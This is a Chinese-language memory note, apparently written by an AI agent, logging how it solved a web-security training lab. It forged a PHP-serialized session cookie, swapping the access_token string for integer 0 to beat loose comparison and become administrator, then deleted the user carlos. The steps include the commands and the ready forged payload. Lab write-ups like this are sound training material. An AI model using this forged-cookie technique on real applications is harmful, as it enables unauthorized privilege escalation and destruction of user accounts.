---
metadata:
  node_type: memory
name: "PRS arm A lab-deserialization-modifying-serialized-data-types"
description: "arm A 基线:lab-deserialization-modifying-serialized-data-types 冷实例一次通过 - session cookie 的 PHP 序列化对象 access_token 改整型 0 破松散比较,username=administrator 提权删 carlos"
last_updated: 2026-10-09T09:44:08+08:00
created: 2026-10-09T09:44:08+08:00
---

## 2026-10-09 arm A 基线(lab-deserialization-modifying-serialized-data-types/A)

冷实例(reused:false),一次通过到 congrats。

### 链路
1. `range_launch launch-url /web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types --jar /tmp/cj1.json` → 实例根,reused:false。
2. `http_session get <root>`:首页 `Set-Cookie: session=;`(空,未登录无对象)。
3. `http_session post <root>/login --form username=wiener --form password=peter`:302 → /my-account?id=wiener,`Set-Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7...%3d%3d`。
4. base64 解出:`O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"eqonk9xhb1q7aqm4nb1kysjojzqrzy9d";}` —— 会话对象就是明文 base64 的 PHP 序列化串(非加密),可直接改。
5. `phpser 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}'` → cookie_value 就是 base64(75 字节,无 `=` 填充,免 URL 转义)。
6. cookie 注入:直接 edit /tmp/cj1.json 里该 host 的 session 值(jar 是 host→{name:value} 的扁平 JSON),未动其它 host 条目。
7. `http_session get <root>/my-account --jar`:200 + `Your username is: administrator`,top-links 出现 `/admin` —— 提权成立。
8. `http_session get <root>/admin`:用户表列出 wiener / carlos,删除链接 `/admin/delete?username=carlos`。
9. `http_session get <root>/admin/delete?username=carlos`:302 → /admin。
10. `banner_verdict <root> --jar`:`solved:true` / "Congratulations, you solved the lab!"。

### 机理
题面即「改数据类型的反序列化」:服务端用 PHP 松散比较(`==`)校验 access_token,
把 `s:32:"..."`(字符串)换成 `i:0`(整型 0)后,`0 == "<非数字字符串>"` 在 PHP 7 语义下为真
(字符串被转成 0),于是任意 username(administrator)都能通过校验。
与 `lab-deserialization-modifying-serialized-objects`(改 `b:0`→`b:1` 的布尔字段)是同一序列化面上的两种混淆,件面都用 phpser。

### 可复用点
- 会话 cookie 形态:先 `http_session jar` 看 jar 结构;PHP 序列化 cookie 常见 `%3d%3d` 尾(URL 编码的 `==`),改值时若新 base64 无填充可直接裸放。
- 改 cookie 的最小代价路径:edit /tmp/cj1.json 对应 host 的 session 字段(免额外造请求件)。
- `phpser` 对无 NUL 的对象模板同样适用,base64 与 URL 编码形一次给全。
- 全程走件:range_launch / http_session / phpser / banner_verdict;无 sh_run、无手搓 bash。

